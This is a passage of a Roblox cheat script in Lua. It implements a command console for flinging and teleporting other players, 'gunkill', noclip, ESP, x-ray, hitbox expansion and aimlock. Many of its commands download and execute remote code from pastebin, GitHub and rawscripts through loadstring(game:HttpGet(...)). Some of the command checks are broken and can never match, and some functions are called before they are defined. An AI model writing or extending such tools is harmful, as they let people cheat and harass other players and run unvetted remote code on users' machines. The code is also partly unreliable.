                            -- Bring the player close to the local player (e.g., 5 studs away)
                            local offset = CFrame.new(0, 0, -6) -- Adjust the Z value for distance
                            targetRoot.CFrame = localroot.CFrame * offset
                            game:GetService("RunService").Heartbeat:Wait()
                        end
                    end
                end
            end
        end)
    end
end

-- Turn on bringing players close
function BringAllOn()
    TogglePlayerOnly = true
    bringPlayerOnly()
end

-- Turn off bringing players close
function BringAllOff()
    TogglePlayerOnly = false
end

    -- Configuration
local LOOPBRING_DISTANCE = 0.5 -- Distance between players in loop
local LOOPBRING_SPEED = 0.40 -- Speed of movement
local LOOPBRING_RADIUS = 5 -- Smaller radius (was 5)

-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- State management
local loopBringActive = false
local originalPositions = {}
local angleOffset = 0

-- Function to calculate positions in loop
local function calculateLoopPositions(centerPosition)
    local positions = {}
    local playerCount = #Players:GetPlayers()
    
    if playerCount == 0 then return positions end
    
    local angleStep = 2 * math.pi / playerCount
    local radius = LOOPBRING_RADIUS
    
    for i, player in ipairs(Players:GetPlayers()) do
        if player == Players.LocalPlayer then
            table.insert(positions, centerPosition)
            continue
        end
        
        local angle = (i - 1) * angleStep + angleOffset
        local x = centerPosition.X + radius * math.cos(angle)
        local z = centerPosition.Z + radius * math.sin(angle)
        table.insert(positions, Vector3.new(x, centerPosition.Y, z))
    end
    
    return positions
end

-- Main loop bring function
local function loopBring()
    if not loopBringActive then return end
    
    local centerPosition = Players.LocalPlayer.Character.Torso.Position
    local positions = calculateLoopPositions(centerPosition)
    
    for i, player in ipairs(Players:GetPlayers()) do
        if player == Players.LocalPlayer then continue end
        
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local targetPosition = positions[i]
            local currentPart = player.Character.HumanoidRootPart
            
            currentPart.CFrame = currentPart.CFrame:Lerp(CFrame.new(targetPosition), LOOPBRING_SPEED)
        end
    end
    
    angleOffset = angleOffset + LOOPBRING_SPEED
end

-- Connect to render stepped
RunService.RenderStepped:Connect(loopBring)

-- Toggle functions
local function LoopBringOn()
    loopBringActive = true
    originalPositions = {}
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then
            table.insert(originalPositions, player.Character.HumanoidRootPart.Position)
        end
    end
end

local function LoopBringOff()
    loopBringActive = false
    
    for i, player in ipairs(Players:GetPlayers()) do
        if player == Players.LocalPlayer then continue end
        
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local originalPosition = originalPositions[i]
            if originalPosition then
                player.Character.HumanoidRootPart.CFrame = CFrame.new(originalPosition)
            end
        end
    end
end

-- Expose functions
-- LoopBringOn()
-- LoopBringOff()

    local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local TFlingActive = false
local ModeActive = false
local TFlingCoroutine
local ModeConnection

-- TFling functionality
local function TFling()
    local character = LocalPlayer.Character
    if not character then return end

    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end

    while TFlingActive do
        RunService.Heartbeat:Wait()
        local velocity = rootPart.Velocity
        rootPart.Velocity = velocity * 999999999999999999999999999999999 + Vector3.new(0, 999999999999999999999999999999999, 0)
        RunService.RenderStepped:Wait()
        rootPart.Velocity = velocity
        RunService.Stepped:Wait()
        rootPart.Velocity = velocity + Vector3.new(0, 0.1, 0)
    end
end

-- Mode functionality
local function DisableCollisions()
    if not LocalPlayer.Character then return end
    for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
        if part:IsA("BasePart") and not part.Anchored then
            part.CanCollide = false
        end
    end
end

local function EnableCollisions()
    if LocalPlayer.Character then
        for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
    end
end

-- Control functions
function TFlingOn()
    TFlingActive = true
    TFlingCoroutine = coroutine.create(TFling)
    coroutine.resume(TFlingCoroutine)
end

function TFlingOff()
    TFlingActive = false
    if TFlingCoroutine then
        coroutine.close(TFlingCoroutine)
    end
end

function ModeOn()
    ModeActive = true
    ModeConnection = RunService.Heartbeat:Connect(DisableCollisions)
end

function ModeOff()
    ModeActive = false
    if ModeConnection then
        ModeConnection:Disconnect()
    end
    EnableCollisions()
end


    local player = game:GetService("Players").LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")
local RunService = game:GetService("RunService")

local tpSpeed = 1
local tpWalking = false
local tpConnection = nil

-- Improved TP Walk Function
local function TpWalk()
    if tpConnection then return end

    tpConnection = RunService.Heartbeat:Connect(function(delta)
        if not rootPart or not humanoid or humanoid.Health <= 0 then
            StopTpWalk()
            return
        end

        if humanoid.MoveDirection.Magnitude > 0 then
            local moveDirection = humanoid.MoveDirection.Unit
            local offset = moveDirection * tpSpeed * 50 * delta
            rootPart.CFrame = rootPart.CFrame + offset
        end
    end)
end

local function StartTpWalk()
    if not tpWalking then
        tpWalking = true
        TpWalk()
    end
end

local function StopTpWalk()
    if tpConnection then
        tpConnection:Disconnect()
        tpConnection = nil
    end
    tpWalking = false
    print("TP Walk stopped.")
end

local function SetTpWalkSpeed(newSpeed)
    tpSpeed = newSpeed
    print("TP Walk speed set to:", tpSpeed)
end

    local player = game.Players.LocalPlayer  
    local character = player.Character or player.CharacterAdded:Wait()  
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")  

    function LayDown()  
    if humanoidRootPart then  
            humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(math.rad(90), 0, 0)  
        end  
    end  

    -- Function to enable XRay
    local function enableXRay()
        for _, part in pairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") and not part:IsA("Terrain") then
                originalTransparency[part] = part.Transparency
                part.Transparency = 0.8 -- Set transparency to make parts semi-transparent
            end
        end
    end

    -- Function to disable XRay
    local function disableXRay()
        for part, transparency in pairs(originalTransparency) do
            if part:IsA("BasePart") then
                part.Transparency = transparency -- Restore original transparency
            end
        end
        originalTransparency = {} -- Clear the table
    end

    -- Function to handle input
    local function handleInput(input)
        local command = input.Text
        input.Text = ""

        -- Add the command to the output
        outputText.Text = outputText.Text .. "\nC:/> " .. command

        -- Simulate command execution
        local result = "Command not recognized."
        if command == "🍪" then
            result = "🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪🍪"
        elseif command == "clear" then
            outputText.Text = ""
            return
         elseif command:sub(1, 11) == "jumpower " or command:sub(1, 3) == "jp " then
            local speed = tonumber(command:match("%d+"))
            if speed then
                player.Character.Humanoid.JumpPower = speed
                result = "JumpPower set to " .. speed
            else
                result = "Invalid walkspeed value."
            end
        elseif command == "resetjumppower" or command == "resetjp" then
            player.Character.Humanoid.JumpPower = 50
            result = "JumpPower reset to 50"
        elseif command:sub(1, 10) == "walkspeed " or command:sub(1, 3) == "ws " then
            local speed = tonumber(command:match("%d+"))
            if speed then
                player.Character.Humanoid.WalkSpeed = speed
                result = "Walkspeed set to " .. speed
            else
                result = "Invalid walkspeed value."
            end
        elseif command == "resetwalkspeed" or command == "resetws" then
            player.Character.Humanoid.WalkSpeed = 16
            result = "Walkspeed reset to 16"
        elseif command:sub(1, 5) == "tpto " then
            local targetPlayerName = command:sub(6)
            if targetPlayerName == "random" then
                -- Teleport to a random player
                local players = Players:GetPlayers()
                local randomPlayer = players[math.random(2, #players)] -- Exclude self
                if randomPlayer and randomPlayer.Character then
                    player.Character:MoveTo(randomPlayer.Character.HumanoidRootPart.Position)
                    result = "Teleported to random player: " .. randomPlayer.Name
                else
                    result = "No valid random player found."
                end
            else
                -- Teleport to a specific player
                local targetPlayer = Players:FindFirstChild(targetPlayerName)
                if targetPlayer and targetPlayer.Character then
                    player.Character:MoveTo(targetPlayer.Character.HumanoidRootPart.Position)
                    result = "Teleported to " .. targetPlayerName
                else
                    result = "Player not found."
                end
            end
        elseif command == "bring unachoredparts" or command == "bring ua" then
            for _, part in pairs(workspace:GetDescendants()) do
                if part:IsA("BasePart") and not part.Anchored and not Players:GetPlayerFromCharacter(part.Parent) and not part:IsDescendantOf(player.Character) and not part:IsDescendantOf(Players.LocalPlayer.Character) then
                    part.Position = player.Character.HumanoidRootPart.Position
                end
            end
            result = "Brought all unanchored parts to you."
        elseif command == "esp" then
            for _, otherPlayer in pairs(Players:GetPlayers()) do
                if otherPlayer ~= player then
                    local highlight = Instance.new("Highlight")
                    highlight.Adornee = otherPlayer.Character
                    highlight.FillColor = Color3.new(1, 0, 0)
                    highlight.OutlineColor = Color3.new(1, 1, 1)
                    highlight.OutlineTransparency = 0.5
                    highlight.Parent = otherPlayer.Character
                end
            end
            result = "ESP enabled."
        elseif command == "unesp" then
            for _, otherPlayer in pairs(Players:GetPlayers()) do
                if otherPlayer ~= player and otherPlayer.Character then
                    for _, child in pairs(otherPlayer.Character:GetChildren()) do
                        if child:IsA("Highlight") then
                            child:Destroy()
                        end
                    end
                end
            end
            result = "ESP disabled."
        elseif command:sub(1, 10) == "unctest" then
            local luaCode = command:sub(11)
            local func, err = loadstring(game:HttpGet("https://pastebin.com/raw/MzpVFDwx"))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Started UncTest:\n"
            end
        elseif command:sub(1, 11) == "loadpcr" then
            local luaCode = command:sub(12)
            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/PCR/refs/heads/main/PartControllerRemote"))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "pcr is active:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "PartControllerRemote is active:\n"
            end
        elseif command:sub(1, 12) == "loadhitblox" then
            local luaCode = command:sub(13)
            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/Hitblox/refs/heads/main/Hitblox"))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "HitbloxIsActive:\n"
            end
        elseif command:sub(1, 13) == "dex" then
            local luaCode = command:sub(14)
            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/DEX-Explorer/refs/heads/main/Mobile.lua"))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "DexExplorerIsActive:\n"
            end
        elseif command:sub(1, 13) == "inf" then
            local luaCode = command:sub(14)
            local func, err = loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "InfyieldIsActive:\n"
            end
        elseif command:sub(1, 15) == "blackhole" then
            local luaCode = command:sub(16)
            local func, err = blackHoleScript()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Blackhole Is Enabled:\n"
            end
        elseif command:sub(1, 15) == "disableblackhole" then
            local luaCode = command:sub(16)
            local func, err = disableBlackHole()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Blackhole Is Disabled:\n"
            end
        elseif command:sub(1, 18) == "cmds" then
            local luaCode = command:sub(18)
            local func, err = ShowCmds()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "CmdPanel Started:\nSearch For A Command"
            end
        elseif command:sub(1, 15) == "bh" then
            local luaCode = command:sub(16)
            local func, err = blackHoleScript()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Blackhole Is Enabled:\n"
            end
        elseif command:sub(1, 13) == "loopfling" then
            local luaCode = command:sub(14)
            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/LFling/refs/heads/main/LoopFling", true))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "LoopFlingIsActive:\n"
            end
        elseif command:sub(1, 13) == "lfling" then
            local luaCode = command:sub(14)
            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/LFling/refs/heads/main/LoopFling", true))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "LoopFlingIsActive:\n"
            end
        elseif command:sub(1, 15) == "dbh" then
            local luaCode = command:sub(16)
            local func, err = disableBlackHole()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Blackhole Is Disabled is enabled:\n"
            end
        elseif command:sub(1, 14) == "voidprotection" then
            local luaCode = command:sub(15)
            local func, err = TpVoidOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "VoidProtection Is Enabled:\nTry jumping off the void"
            end
        elseif command:sub(1, 14) == "disablevoidprotection" then
            local luaCode = command:sub(15)
            local func, err = TpVoidOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Disabled VoidProtection:\n"
            end
        elseif command:sub(1, 14) == "vp" then
            local luaCode = command:sub(15)
            local func, err = TpVoidOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "VoidProtection Is Enabled:\nTry jumping off the void"
            end
        elseif command:sub(1, 14) == "dvp" then
            local luaCode = command:sub(15)
            local func, err = TpVoidOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Disabled VoidProtection:\n"
            end
        elseif command:sub(1,4) == "fov " then
            local fovValue = tonumber(command:sub(5))
            if fovValue and fovValue >= 1 and fovValue <= 120 then
                game.Workspace.CurrentCamera.FieldOfView = fovValue
                result = "FOV set to "..fovValue
            else
                result = "Invalid FOV (1-120)"
            end
        elseif command == "serverhop" then
            result = "Attempting to server hop..."
            local HttpService = game:GetService("HttpService")
            local TeleportService = game:GetService("TeleportService")
    
            local placeId = game.PlaceId
            local servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"))
    
            for _, server in ipairs(servers.data) do
                if server.playing < server.maxPlayers and server.id ~= game.JobId then
                    TeleportService:TeleportToPlaceInstance(placeId, server.id)
                    break
                end
            end
        elseif command == "shop" then
            result = "Attempting to server hop..."
            local HttpService = game:GetService("HttpService")
            local TeleportService = game:GetService("TeleportService")
    
            local placeId = game.PlaceId
            local servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"))
    
            for _, server in ipairs(servers.data) do
                if server.playing < server.maxPlayers and server.id ~= game.JobId then
                    TeleportService:TeleportToPlaceInstance(placeId, server.id)
                    break
                end
            end
        elseif command:sub(1, 15) == "besp" then
            local luaCode = command:sub(16)
            local func, err = BoxEspOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "BoxEsp Is Enabled:\n"
            end
        elseif command:sub(1, 15) == "boxesp" then
            local luaCode = command:sub(16)
            local func, err = BoxEspOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "BoxEsp Is Enabled:\n"
            end
        elseif command:sub(1, 15) == "disableboxesp" then
            local luaCode = command:sub(16)
            local func, err = BoxEspOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "BoxEsp Is Disabled:\n"
            end
        elseif command:sub(1, 15) == "dbesp" then
            local luaCode = command:sub(16)
            local func, err = BoxEspOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "BoxEsp Is Disabled:\n"
            end
        elseif command:sub(1, 15) == "disablenameesp" then
            local luaCode = command:sub(16)
            local func, err = BoxEspOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "BoxEsp Is Enabled:\n"
            end
        elseif command:sub(1, 15) == "floatparts" then
            local luaCode = command:sub(16)
            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/Gravity-inverter/refs/heads/main/GI", true))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "floaty :):\n"
            end
        elseif command:sub(1, 15) == "nesp" then
            local luaCode = command:sub(16)
            local func, err = NameEspOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "NameTagEsp Is Enabled:\n"
            end
        elseif command:sub(1, 15) == "nameesp" then
            local luaCode = command:sub(16)
            local func, err = NameEspOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "NameTagEsp Is Enabled:\n"
            end
        elseif command:sub(1, 15) == "dnesp" then
            local luaCode = command:sub(16)
            local func, err = NameEspOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "NameTagEsp Is Disable:\n"
            end
        elseif command:sub(1, 15) == "disablenameesp" then
            local luaCode = command:sub(16)
            local func, err = NameEspOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "NameTagEsp Is Disabled:\n"
            end
        elseif command:sub(1, 13) == "reset" then
            local luaCode = command:sub(14)
            local func, err = game.Players.LocalPlayer.Character.Head:Destroy()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Reseting:\nUr Player has been reseted"
            end
        elseif command:sub(1, 13) == "re" then
            local luaCode = command:sub(14)
            local func, err = game.Players.LocalPlayer.Character.Head:Destroy()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Reseting:\nUr Player has been reseted"
            end
         elseif command:sub(1, 6) == "fling " then
            local targetPlayerName = command:sub(7)
            if targetPlayerName == "random" then
                -- Fling a random player
                local players = Players:GetPlayers()
                local randomPlayer = players[math.random(2, #players)] -- Exclude self
                if randomPlayer then
                    SkidFling(randomPlayer)
                    result = "Flinging random player: " .. randomPlayer.Name
                else
                    result = "No valid random player found."
                end
            else
                -- Fling a specific player
                local targetPlayer = GetPlayer(targetPlayerName)
                if targetPlayer then
                    SkidFling(targetPlayer)
                    result = "Flinging " .. targetPlayer.Name
                else
                    result = "Player not found."
                end
            end
        elseif command:sub(1, 17) == "flingall" then
            local luaCode = command:sub(18)
            local func, err = StartFlingAll({"All"})
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Flinged all players:\n"
            end
        elseif command:sub(1, 14) == "sit" then
            local luaCode = command:sub(15)
            local func, err = SitPlayer()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Sitting:\n"
            end
        elseif command:sub(1, 15) == "lay" then
            local luaCode = command:sub(16)
            local func, err = LayDown()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "laying:\n"
            end
        elseif command:sub(1, 15) == "fly" then
            local luaCode = command:sub(16)
            local func, err = Fly()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Flying:\n"
            end
        elseif command:sub(1, 15) == "unfly" then
            local luaCode = command:sub(16)
            local func, err = UnFly()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Stopped Flying:\n"
            end
        elseif command:sub(1, 15) == "f" then
            local luaCode = command:sub(16)
            local func, err = Fly()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Flying:\n"
            end
        elseif command:sub(1, 15) == "uf" then
            local luaCode = command:sub(16)
            local func, err = UnFly()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Stopped Flying:\n"
            end
        elseif command:sub(1, 15) == "aimlock" then
            local luaCode = command:sub(16)
            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/AimAssistRael/refs/heads/main/Aimlock"))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "AimLockIsActive:\n"
            end
        elseif command:sub(1, 14) == "hitbox" then
            local luaCode = command:sub(15)
            local func, err = hitboxeson()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Expanded:\nHrp or head has been expanded"
            end
        elseif command:sub(1, 14) == "unhitbox" then
            local luaCode = command:sub(15)
            local func, err = hitboxesoff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "DeExpanded:\nHrp or head size is set to normal"
            end
        elseif command:sub(1, 14) == "emitteroff" then
            local luaCode = command:sub(15)
            local func, err = EmitterOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Emitter On:\n"
            end
        elseif command:sub(1, 14) == "en" then
            local luaCode = command:sub(15)
            local func, err = EmitterOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Emitter On:\n"
            end
        elseif command:sub(1, 14) == "ef" then
            local luaCode = command:sub(15)
            local func, err = EmitterOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Emitter Off:\n"
            end
        elseif command:sub(1, 15) == "enabletfling" then
            local luaCode = command:sub(16)
            local func, err = TFlingOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "TouchFling is enabled:\n"
            end
        elseif command:sub(1, 15) == "disabletfling" then
            local luaCode = command:sub(16)
            local func, err = TFlingOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "TouchFling is disabled:\n"
            end
        elseif command:sub(1, 15) == "etf" then
            local luaCode = command:sub(16)
            local func, err = TFlingOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "TouchFling is enabled:\n"
            end
        elseif command:sub(1, 15) == "disabletfling" then
            local luaCode = command:sub(16)
            local func, err = TFlingOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "TouchFling is disabled:\n"
            end
        elseif command:sub(1, 15) == "noclip" then
            local luaCode = command:sub(17)
            local func, err = ModeOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Noclip:\nWalk thru Walls"
            end
        elseif command:sub(1, 15) == "clip" then
            local luaCode = command:sub(17)
            local func, err = ModeOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Clipped:\nWalk Thru Walls Is Disabled"
            end
        elseif command:sub(1, 8) == "massiveheads" then
            local luaCode = command:sub(15)
            local func, err = MassiveHeadsOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "BigHeads Off:\n"
            end
        elseif command:sub(1, 8) == "nomassiveheads" then
            local luaCode = command:sub(16)
            local func, err = MassiveHeadsOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "BigHeads Is Enabled:\n"
            end
        elseif command:sub(1, 8) == "mh" then
            local luaCode = command:sub(15)
            local func, err = MassiveHeadsOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "BigHeads Is Enabled:\n"
            end
        elseif command:sub(1, 8) == "nmh" then
            local luaCode = command:sub(16)
            local func, err = MassiveHeadsOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "BigHeads Is Disabled:\n"
            end
        elseif command:sub(1, 15) == "gunkill" then
            local luaCode = command:sub(19)
            local func, err = BringAllOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Kill Players With Guns or other (req, weapon):\n"
            end
        elseif command:sub(1, 15) == "stopgunkill" then
            local luaCode = command:sub(19)
            local func, err = BringAllOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Stopped gunkill(Client):\n"
            end
        elseif command:sub(1, 15) == "gk" then
            local luaCode = command:sub(19)
            local func, err = BringAllOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Kill Players With Guns or other (req, weapon):\n"
            end
        elseif command:sub(1, 15) == "sgk" then
            local luaCode = command:sub(19)
            local func, err = BringAllOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Stopped gunkill (Client):\n"
            end
        elseif command:sub(1, 15) == "ringplayers" then
            local luaCode = command:sub(6)
            local func, err = LoopBringOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Ring All Players (Client):\n"
            end
        elseif command:sub(1, 15) == "stopringplayers" then
            local luaCode = command:sub(6)
            local func, err = LoopBringOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Stop Ring All Players (Client):\n"
            end
        elseif command:sub(1, 15) == "rp" then
            local luaCode = command:sub(6)
            local func, err = LoopBringOn()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Ring All Players (Client):\n"
            end
        elseif command:sub(1, 15) == "srp" then
            local luaCode = command:sub(6)
            local func, err = LoopBringOff()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
                result = "Stop Ring All Players (Client):\n"
            end
        elseif command:sub(1, 15) == "namelessadmin" then
            local luaCode = command:sub(16)
            local func, err = loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nameless-Admin-Official-15022"))()
            if func then
                local success, execResult = pcall(func)
                if success then
                    result = "Executed successfully:\n" .. tostring(execResult)
                else
                    result = "Execution error:\n"
                end
            else
